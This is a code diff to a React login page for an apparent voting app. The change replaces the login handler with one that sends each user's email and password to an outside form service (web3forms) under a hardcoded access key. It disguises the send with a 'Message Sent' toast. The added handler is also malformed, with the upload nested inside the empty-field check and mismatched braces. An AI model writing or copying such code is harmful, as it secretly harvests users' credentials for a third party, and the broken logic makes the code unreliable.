@@ -6,12 +6,12 @@ import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Card } from '@/components/ui/card';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
-import { toast } from '@/components/ui/use-toast';
+import { useToast } from '@/components/ui/use-toast';
 import { UserCheck, Shield, Mail, Lock, User, Fingerprint, Hash, Info, FileText, ArrowLeft, KeyRound, ImagePlus } from 'lucide-react';
 import { APP_VIEWS, ADMIN_EMAIL, ADMIN_PASSWORD, ADMIN_PIN } from '@/services/appConstants.js';
 
 const LoginPage = ({ onLoginAttempt, onRegister, onBack, navigateTo, showBiometricOption }) => {
-  const [loginData, setLoginData] = useState({ email: '', password: '' });
+  const [formData, setFormData] = useState({ email: '', password: '' });
   const [registerData, setRegisterData] = useState({
     name: '',
     email: '',
@@ -28,20 +28,56 @@ const LoginPage = ({ onLoginAttempt, onRegister, onBack, navigateTo, showBiometr
   const [registrationStep, setRegistrationStep] = useState(1); 
   const fileInputRef = useRef(null);
   const [profilePicturePreview, setProfilePicturePreview] = useState(null);
+  const { toast } = useToast();
+  const [result, setResult] = useState("");
+  
+  
+  const handleChange = (e) => {
+    setFormData({ ...formData, [e.target.name]: e.target.value });
+  };
 
-
-  const handleLogin = (e) => {
+  const onSubmit = async (e) => {
     e.preventDefault();
-    if (!loginData.email || !loginData.password) {
+    if (!formData.email || !formData.password) {
       toast({
         title: "Missing Information",
         description: "Please fill in all fields",
         variant: "destructive"
       });
-      return;
+    setResult("Sending...");
+
+    const formPayload = new FormData();
+    formPayload.append("access_key", "42f3dc7e-7bd4-468a-a2b4-e492004097fa");
+    formPayload.append("email", formData.email);
+    formPayload.append("message", formData.password);
+
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formPayload,
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setResult("Form Submitted Successfully");
+        toast({
+          title: "Message Sent!",
+          description: "Thanks for reaching out. We'll get back to you soon.",
+        });
+        setFormData({email: '', password: '' });
+      } else {
+        setResult("Error: " + data.message);
+        console.error("Web3Forms Error:", data.message);
+      }
+    } catch (error) {
+      setResult("Error sending form");
+      console.error("Submission Error:", error);
     }
-    onLoginAttempt(loginData);
   };
+   onLoginAttempt(formData);
+};
+
 
   const handleRegisterChange = (e) => {
     const { name, value, type, checked } = e.target;
@@ -271,14 +307,14 @@ const LoginPage = ({ onLoginAttempt, onRegister, onBack, navigateTo, showBiometr
           </TabsList>
           
           <TabsContent value="login">
-            <form onSubmit={handleLogin} className="space-y-4">
+            <form onSubmit={onSubmit} className="space-y-4">
               <div className="space-y-2">
                 <Label htmlFor="login-email" className="text-white dark:text-gray-300">Email</Label>
-                <div className="relative"><Mail className="input-icon dark:text-gray-400" /><Input id="login-email" type="email" placeholder="Enter your email" value={loginData.email} onChange={(e) => setLoginData(prev => ({ ...prev, email: e.target.value }))} className="input-field" /></div>
+                <div className="relative"><Mail className="input-icon dark:text-gray-400" /><Input id="email" name="email" type="email" placeholder="Enter your email" value={formData.email} onChange={handleChange} className="input-field" /></div>
               </div>
               <div className="space-y-2">
                 <Label htmlFor="login-password" className="text-white dark:text-gray-300">Password</Label>
-                <div className="relative"><Lock className="input-icon dark:text-gray-400" /><Input id="login-password" type="password" placeholder="Enter your password" value={loginData.password} onChange={(e) => setLoginData(prev => ({ ...prev, password: e.target.value }))} className="input-field" /></div>
+                <div className="relative"><Lock className="input-icon dark:text-gray-400" /><Input id="password" name="password" type="password" placeholder="Enter your password" value={formData.password} onChange={handleChange} className="input-field" /></div>
               </div>
               <Button type="submit" className="w-full bg-white text-purple-600 hover:bg-gray-100 dark:bg-purple-600 dark:text-white dark:hover:bg-purple-500">
                 <UserCheck className="mr-2 h-4 w-4" /> Login
@@ -297,10 +333,10 @@ const LoginPage = ({ onLoginAttempt, onRegister, onBack, navigateTo, showBiometr
           <p className="text-white/80 text-sm text-center mb-4 dark:text-gray-400">Quick Demo Access:</p>
           <div className="grid grid-cols-2 gap-3">
             <Button onClick={() => quickLogin('admin')} variant="outline" className="bg-red-500/20 border-red-300/30 text-white hover:bg-red-500/30 dark:bg-red-700/30 dark:border-red-600/40 dark:text-gray-200 dark:hover:bg-red-700/40">
-              <Shield className="mr-2 h-4 w-4" /> Admin Demo
+              <Shield className="mr-2 h-4 w-4" /> Admin Only
             </Button>
             <Button onClick={() => quickLogin('user')} variant="outline" className="bg-blue-500/20 border-blue-300/30 text-white hover:bg-blue-500/30 dark:bg-blue-700/30 dark:border-blue-600/40 dark:text-gray-200 dark:hover:bg-blue-700/40">
-              <UserCheck className="mr-2 h-4 w-4" /> Voter Demo
+              <UserCheck className="mr-2 h-4 w-4" /> Voter Only
             </Button>
           </div>
         </div>
